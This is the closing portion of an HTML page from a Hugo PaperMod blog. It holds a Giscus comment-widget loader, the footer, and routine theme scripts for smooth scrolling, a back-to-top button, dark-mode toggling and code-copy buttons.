    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
